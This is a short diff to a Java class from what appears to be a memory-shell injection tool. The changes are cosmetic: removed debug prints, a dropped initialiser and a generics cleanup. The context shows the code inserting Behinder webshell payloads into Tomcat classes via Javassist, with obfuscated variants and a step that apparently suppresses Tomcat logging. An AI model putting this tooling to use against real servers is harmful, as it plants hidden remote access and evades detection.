@@ -25,9 +25,6 @@ public class ClassMethodHandler {
      * @throws Exception 抛出异常
      */
     public static void insertMethod(CtClass ctClass, String method, String payload) throws Exception {
-        //System.out.println(ctClass);
-        //System.out.println(method);
-        //System.out.println(payload);
         CtMethod cm = ctClass.getDeclaredMethod(method);
         cm.insertBefore(payload);
     }
@@ -125,7 +122,7 @@ public class ClassMethodHandler {
                 insertGetUnsafe(ctClass);
             }
 
-            String shell = "";
+            String shell;
             if (isTomcat) {
                 insertTomcatNoLog(ctClass);
                 shell = Config.IS_OBSCURE ? MemShellPayloads.BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : MemShellPayloads.BEHINDER_SHELL_FOR_TOMCAT;
@@ -278,7 +275,7 @@ public class ClassMethodHandler {
      * @throws Exception 抛出异常
      */
     public static String getMethodName(CtClass ctClass) throws Exception {
-        List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
+        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
         String name = ctClass.getName();
         String method = "";
         classes.add(ctClass.getSuperclass());
